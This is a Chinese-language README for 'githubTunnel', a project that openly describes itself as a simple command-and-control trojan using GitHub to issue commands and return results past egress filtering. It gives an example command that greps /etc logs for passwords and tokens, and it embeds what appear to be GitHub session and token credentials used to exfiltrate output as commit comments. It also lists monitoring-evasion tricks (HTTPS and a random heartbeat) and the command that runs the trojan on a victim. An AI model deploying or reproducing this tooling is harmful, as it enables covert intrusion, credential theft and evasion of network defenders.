# githubTunnel
一个使用github作为控制域名的简单c&c木马。

github作为开发常用的域名，有大概率会被加入网络封禁白名单，因此可以使用github突破IDC--外网限制，实现下发命令，并回传结果。

# 下发命令
使用项目中[cmd.txt](https://github.com/Lonely-night/githubTunnel/blob/master/cmd.txt )文件下发命令
cmd.txt 文件内容如下：
duye_cmd: {find /etc/ -name "*.log"|xargs grep -E "pass|token"}
session: {jlIFqVDcuLBUedOIabZYb4zMPoIWwkj0E8bPMOzHkrmRjWD6}
token: {V1hjNlJg6DohGkaIhuxKH3Elwgz3j1sdwCcTRaSnw/VE7vCv3BzOTvcM9bwBVGRJXZbecitKBzhm+Z4oFS7TSg==}

其中 duye_cmd 设置木马执行的命令。session 和token为github的凭证，用来把命令执行结果上报至github。
session：是github网站的cookie中user_session的值
token： github提交评论的token 
，可以在 [commit](https://github.com/Lonely-night/githubTunnel/commit/c6602cec0951bfc7a13f4de5b0399911ec5fa1ae)界面提交一个评论，从请求中post参数获取。

# 回传结果
使用 https://github.com/Lonely-night/githubTunnel/blob/master/cmd.txt文件中定义github session、github token。 向指定commit，提交评论以实现
结果回传。
https://github.com/Lonely-night/githubTunnel/commit/41811231fd220ae9af2038ec1fcbb50819aaedf9


# 网络监测绕过
1. 使用https加密通讯，绕过网络层监测。
2. 使用0 - 60 随机心跳，绕过网络层心跳监测。

# 使用
修改Trojan.py 文件中
control_url = "获取命令的地址" 
response_url = "会写结果的项目地址"
commit_id = "回写结果的commit_id"

在被控端执行

```bash
python Trojan.py &
```
结果会在
https://github.com/账号/项目/commit/回写结果的commit_id 地址回显。

示例：
https://github.com/Lonely-night/githubTunnel/commit/41811231fd220ae9af2038ec1fcbb50819aaedf9#comments

